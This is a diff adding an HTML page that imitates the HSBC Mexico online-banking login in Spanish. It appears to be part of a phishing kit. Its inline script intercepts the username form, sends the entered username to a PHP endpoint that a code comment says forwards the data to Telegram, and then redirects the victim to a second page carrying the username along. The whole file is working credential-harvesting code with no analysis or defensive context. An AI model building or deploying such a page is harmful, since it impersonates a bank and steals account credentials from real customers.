@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta charset="UTF-8">
+  <title>hsbc</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+  <div class="fon"><img src="logo2.jpg" alt=""></div>
+  <hr class="line">
+  <div class="line-name">Descubre la nueva forma de hacer transferencias y pagos desde tu Banca por internet</div>
+  <hr>
+  <div class="formulario-container">
+    <!-- Aquí está el formulario -->
+    <form id="userForm" action="enviif.php" method="GET">
+      <h1>Iniciar sesión</h1>
+      <h2>Ingresa tu usuario</h2>
+      <!-- Campo de entrada para el usuario -->
+      <input type="text" id="usuario" name="usuario" required>
+      <div class="etiqueta"> <a href="#">¿Olvidaste tu usuario?</a></div>
+      <button type="submit">Continuar</button>
+    </form>
+    <hr>
+    <h4>Regístrate desde la app HSBC Mexico > </h4>
+  </div>
+  <div class="palabra-en-lineas">
+    <span><i class="fas fa-phone"></i>Horarios</span>
+    <span><i class="fas fa-hands-helping"></i> Demos ayuda</span>
+    <span><i class="fas fa-map-marker-alt"></i>Contrato</span>
+    <span><i class="fas fa-envelope"></i> Seguridad en línea</span>
+  </div>
+  <div class="palabra-en-line">
+    <span>Contacto</span>
+    <span>Aclaraciones y Quejas</span> 
+    <span>Promociones</span>
+    <span>Síguenos en Facebook</span>
+    <span>Síguenos en Youtube</span> 
+    <hr>
+    <h3>© HSBC México 2023. Todos los Derechos Reservados</h3>
+    <div class="abajo"> 
+      <span>Acerca de HSBC</span>
+      <span>Mapa de Sitio</span>
+      <span>Terminos y condiciones</span>
+      <span>Aviso de privacidad</span>
+      <span>Contacto/UNE</span>
+    </div>
+  </div>
+<script>
+// Redirigir al segundo index con el usuario como parámetro
+document.getElementById("userForm").addEventListener("submit", function(event) {
+    event.preventDefault(); // Evitar que el formulario se envíe automáticamente
+    
+    var usuario = document.getElementById("usuario").value;
+    
+    // Enviar los datos a Telegram
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "envif.php?usuario=" + encodeURIComponent(usuario), true);
+    xhr.send();
+    
+    // Redirigir al segundo index
+    window.location.href = "index2.html?usuario=" + encodeURIComponent(usuario);
+});
+</script>
+</body>
+</html>
